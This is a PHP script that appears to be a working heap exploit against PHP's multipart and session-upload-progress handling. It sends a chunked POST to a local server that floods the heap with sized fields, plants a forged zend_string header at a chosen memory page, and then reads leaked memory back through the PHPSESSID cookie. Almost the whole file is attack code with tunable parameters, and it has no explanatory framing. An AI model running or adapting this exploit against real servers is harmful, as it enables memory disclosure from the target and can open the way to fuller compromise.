<?php
declare(strict_types=1);
/* display_errors=Off B1: 200x231B (md bin page), 13x511-page floods
 * (chunks 0..25), then a forged 511-page value landing on cache[27] (id
 * chunk) with a fake zend_string header at page 0x1fe. */
const BND = 'CCCCCCCCCC';
function part(string $n, string $v = ''): string {
    return '--' . BND . "\r\nContent-Disposition: form-data; name=\"$n\"\r\n\r\n" . $v . "\r\n";
}
function forge_fill(int $pages, int $page, int $len, int $idx = 0, int $dataOff = 0x1018): string {
    $L = $pages * 4096 - 25;
    $v = str_repeat('A', $L);
    $hdr = $page * 0x1000 - $dataOff;
    $v = substr_replace($v, pack('V', 0) . pack('V', 0x16) . pack('P', 0) . pack('P', $len), $hdr, 24);
    $v = substr_replace($v, '/' . sprintf('%02d', $idx % 100) . 'BBBBB', $hdr + 0x18, 8);
    return $v;
}
$port = (int)($argv[1] ?? 8091);
$nf = (int)($argv[2] ?? 13);      // plain 511-page fields
$page = intval($argv[3] ?? '0x1fe', 0); // id page
$leak = intval($argv[4] ?? "0x800", 0);
$dataOff = intval($argv[5] ?? "0x1018", 0);
$xc = (int)($argv[6] ?? 0);
$pad = (int)($argv[7] ?? 0);
$fp = intval($argv[8] ?? "511", 0);
$n231 = (int)($argv[9] ?? 200);
$out = part('PHPSESSID', str_repeat('a', 32));
$out .= part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
$v231 = str_repeat('V', 231);
for ($i = 0; $i < $n231; $i++) {
    $out .= part(sprintf('v%04d', $i), $v231);
}
$big = 511 * 4096 - 25;
for ($i = 0; $i < $nf; $i++) {
    $out .= part(sprintf('b%02d', $i), str_repeat('B', $big));
}
$out .= part('zzzz', forge_fill($fp, $page, $leak, 1, $dataOff));
$padv = str_repeat('P', 511 * 4096 - 25);
for ($i = 0; $i < $pad; $i++) {
    $out .= part(sprintf('p%02d', $i), $padv);
}
for ($i = 0; $i < $xc; $i++) {
    $out .= part(sprintf('x%05d', $i) . str_repeat('[a]', 12), 'v');
}
$out .= '--' . BND . "--\r\n";

$s = @stream_socket_client("tcp://127.0.0.1:$port", $e, $m, 5.0);
if (!$s) { fwrite(STDERR, "connect $m\n"); exit(1); }
stream_set_timeout($s, 120);
fwrite($s, "POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=" . BND
    . "\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n");
for ($o = 0; $o < strlen($out); $o += 262144) {
    $c = substr($out, $o, 262144);
    fwrite($s, dechex(strlen($c)) . "\r\n" . $c . "\r\n");
}
fwrite($s, "0\r\n\r\n");
$resp = '';
while (!feof($s)) { $r = fread($s, 65536); if ($r === false || $r === '') break; $resp .= $r; }
fclose($s);
file_put_contents("/tmp/off_leak.resp", $resp);
$head = explode("\r\n\r\n", $resp, 2)[0];
$cookie = '';
foreach (explode("\r\n", $head) as $line) {
    if (stripos($line, 'set-cookie:') === 0 && preg_match('/PHPSESSID=([^;]*)/', $line, $mm)) {
        $cookie = rawurldecode($mm[1]);
    }
}
printf("nf=%d page=0x%x leak=0x%x body=%d resp=%d status=%s cookie=%d head=%s\n",
    $nf, $page, $leak, strlen($out), strlen($resp), strtok($resp, "\r\n"),
    strlen($cookie), bin2hex(substr($cookie, 0, 16)));
